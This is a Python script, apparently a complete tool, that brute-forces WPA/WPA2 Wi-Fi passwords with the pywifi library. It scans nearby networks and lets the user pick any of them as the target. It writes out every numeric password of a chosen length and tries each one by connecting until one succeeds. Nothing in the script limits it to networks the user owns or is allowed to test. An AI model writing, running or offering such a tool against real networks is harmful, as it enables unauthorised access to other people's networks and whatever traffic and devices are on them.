import argparse  # Used for parsing command-line arguments
import itertools  # Helps in generating combinations of passwords
import os  # Provides functionalities for interacting with the operating system
import random  # Used for shuffling the list of passwords
import time  # Provides various time-related functions

from pywifi import PyWiFi, const, Profile  # PyWiFi library for managing Wi-Fi connections
from tqdm import tqdm  # A fast, extensible progress bar for Python and CLI

# Terminal color codes for enhancing output readability
RED = "\033[1;31m"
GREEN = "\033[0;32m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
RESET = "\033[0;0m"


def clear_screen():
    """
    Clears the terminal screen to ensure clean output, using 'cls' for Windows or 'clear' for Unix-based systems.
    """
    os.system("cls" if os.name == "nt" else "clear")


def get_wifi_interface():
    """
    Selects the Wi-Fi interface to use and prints its details.

    Returns:
    - The selected Wi-Fi interface (iface).
    """
    wifi = PyWiFi()
    if len(wifi.interfaces()) == 0:
        print("No Wi-Fi interface found. Please check your Wi-Fi adapter.")
        exit()

    iface = wifi.interfaces()[0]  # Select the first interface
    print(f"Using Wi-Fi adapter: {iface.name()}")  # Print the name of the interface
    return iface


def format_time(seconds):
    """
    Converts time in seconds to a formatted string of hours, minutes, and seconds.

    Parameters:
    - seconds (float): The time in seconds.

    Returns:
    - A string formatted as "HH:MM:SS".
    """
    hours, remainder = divmod(int(seconds), 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{hours:02}:{minutes:02}:{seconds:02}"


def scan_wifi_networks():
    """
    Scans for available Wi-Fi networks and returns a list of SSID names.

    Returns:
    - A list of SSIDs (str) of available Wi-Fi networks.
    """
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]  # Assuming the first interface is the one we want to use.
    iface.scan()  # Trigger Wi-Fi scan
    time.sleep(2)  # Wait a bit for scan results to populate

    scan_results = iface.scan_results()
    available_networks = [network.ssid for network in scan_results if network.ssid]
    return available_networks


def select_network_from_list(networks):
    """
    Displays available Wi-Fi networks and prompts the user to select one.

    Parameters:
    - networks (list): A list of SSIDs (str) of available Wi-Fi networks.

    Returns:
    - The selected SSID (str) by the user.
    """
    for i, ssid in enumerate(networks, start=1):
        print(f"{i}. {ssid}")

    selection = input("Select a network by number (or press Enter to refresh): ").strip()
    if not selection.isdigit() or int(selection) < 1 or int(selection) > len(networks):
        print(RED + "Invalid selection. Please try again." + RESET)
        return None
    return networks[int(selection) - 1]


def generate_passwords(digit_length):
    """
    Generates a file with all possible numeric combinations for a specified digit length,
    if the file does not already exist.

    Parameters:
    - digit_length (int): The number of digits for each generated password.

    Returns:
    - filename (str): Path to the generated or existing file containing the passwords.
    """
    filename = f"passwords_{digit_length}_digits.txt"

    # Check if the file already exists
    if os.path.exists(filename):
        print(f"File {filename} already exists.")
        user_decision = input("Do you want to overwrite it? (yes/no): ").strip().lower()
        if user_decision != 'yes':
            print("Using the existing file.")
            return filename

    # Proceed to generate the file if it doesn't exist or if the user chooses to overwrite
    total_combinations = 10 ** digit_length
    print(f"Generating {total_combinations} passwords...")
    with open(filename, 'w') as file:
        # itertools.product generates all combinations, 'repeat' specifies password length
        for password in tqdm(itertools.product(range(10), repeat=digit_length), total=total_combinations,
                             desc="Generating passwords"):
            file.write(''.join(map(str, password)) + '\n')
    print("Password file generation complete.")
    return filename


def prompt_for_additional_file():
    """
    Prompts the user to optionally provide a path to an additional password file.

    Returns:
    - file_path (str): Path to the user-provided file, or None if not provided.
    """
    response = input("Do you want to provide another password file? (yes/no): ").strip().lower()
    if response == 'yes':
        file_path = input("Enter the path to the password file: ").strip()
        if os.path.exists(file_path):
            return file_path
        else:
            print(RED + "File does not exist. Proceeding with the generated file." + RESET)
    return None


def connect_wifi(ssid, password, iface):
    """
    Attempts to connect to the specified Wi-Fi network using the provided password.

    Parameters:
    - ssid (str): The SSID of the Wi-Fi network to connect to.
    - password (str): The password to attempt for the connection.

    Returns:
    - True if the connection was successful, False otherwise.
    """
    profile = Profile()
    # Configure the Wi-Fi profile with the SSID and password
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    time.sleep(0.5)  # Wait a bit to see if the connection is successful

    if iface.status() == const.IFACE_CONNECTED:
        print(GREEN + '[*] Crack success! Password is: {}'.format(password) + RESET)
        return True
    return False


def try_passwords(ssid, file_path, iface):
    """
    Iterates over each password in the specified file in random order, attempting to connect to the Wi-Fi network.
    Displays the progress, time elapsed, and estimated time remaining.

    Parameters:
    - ssid (str): The SSID of the Wi-Fi network.
    - file_path (str): Path to the file containing passwords to try.
    - iface: The Wi-Fi interface object to use for connection attempts.
    """
    if not os.path.exists(file_path):
        print(RED + "[-] No such file: " + file_path + RESET)
        return

    # Load all passwords into memory and shuffle them for randomization
    with open(file_path, 'r', encoding='utf-8') as file:
        passwords = [line.strip() for line in file]
    random.shuffle(passwords)

    total_passwords = len(passwords)
    attempts = 0
    start_time = time.time()

    for password in passwords:
        attempts += 1
        print(f"[*] Trying password {attempts} of {total_passwords}: {password}")

        if connect_wifi(ssid, password, iface):
            elapsed_time = time.time() - start_time
            print(GREEN + f"[+] Success! Correct password: {password} found in {format_time(elapsed_time)}." + RESET)
            exit()  # Exit upon successful connection

        # Optional: Print progress and time elapsed periodically or upon certain conditions
        if attempts % 100 == 0 or attempts == total_passwords:
            percent_done = (attempts / total_passwords) * 100
            elapsed_time = time.time() - start_time
            estimated_total_time = elapsed_time / (percent_done / 100)
            remaining_time = estimated_total_time - elapsed_time
            formatted_elapsed = format_time(elapsed_time)
            formatted_remaining = format_time(remaining_time)
            print(
                f"Progress: {percent_done:.2f}%, Time Elapsed: {formatted_elapsed}, Estimated Time Remaining: {formatted_remaining}")

    # Indicate completion if no password succeeded
    if attempts == total_passwords:
        elapsed_time = time.time() - start_time
        print(RED + f"[-] Finished trying all passwords in {format_time(elapsed_time)}. No success." + RESET)


def parse_arguments():
    """
    Parses command line arguments. If arguments are not provided, prompts the user for necessary information.

    Returns:
    - args: Namespace object containing the arguments.
    """
    parser = argparse.ArgumentParser(description="WiFi WPA/WPA2 brute force tool")
    parser.add_argument('-s', '--ssid', help='SSID = WiFi Name', default=None)
    parser.add_argument('-d', '--digits', type=int, help='Number of digits for the password list', default=None)
    args = parser.parse_args()

    # Prompt for missing information if necessary
    if not args.ssid:
        args.ssid = input("Enter SSID (Wi-Fi Name): ").strip()
    if not args.digits:
        digits = input("Enter the number of digits for the password list: ").strip()
        while not digits.isdigit() or int(digits) < 1:
            print(RED + "Please enter a valid number of digits." + RESET)
            digits = input("Enter the number of digits for the password list: ").strip()
        args.digits = int(digits)
    return args


def main():
    """
    Orchestrates the Wi-Fi brute-force attack process with the ability to select a target network from scanned results.
    """
    # Select and display the Wi-Fi adapter being used
    iface = get_wifi_interface()  # Ensure this function is defined as shown in previous instructions

    # Scan for available Wi-Fi networks using the selected interface
    available_networks = scan_wifi_networks()  # Adjust 'scan_wifi_networks' to accept 'iface' if needed
    if not available_networks:
        print(RED + "No Wi-Fi networks found. Please ensure your Wi-Fi is enabled and try again." + RESET)
        return

    # Display available networks and prompt user to select one
    print(CYAN + "Available Wi-Fi Networks:" + RESET)
    selected_ssid = None
    while not selected_ssid:
        selected_ssid = select_network_from_list(available_networks)
        if not selected_ssid:  # If user wants to refresh the list
            available_networks = scan_wifi_networks()  # Again, adjust if 'scan_wifi_networks' needs 'iface'

    digits = input("Enter the number of digits for the password list: ").strip()
    digits = int(digits) if digits.isdigit() else 8
    password_file = generate_passwords(digits)

    additional_file = prompt_for_additional_file()
    file_to_use = additional_file if additional_file else password_file

    clear_screen()
    print(CYAN + f"[+] Starting brute-force attack on SSID: {selected_ssid} using passwords from: {file_to_use}" + RESET)
    try_passwords(selected_ssid, file_to_use, iface)  # Ensure 'try_passwords' is adjusted to accept 'iface'


if __name__ == "__main__":
    main()
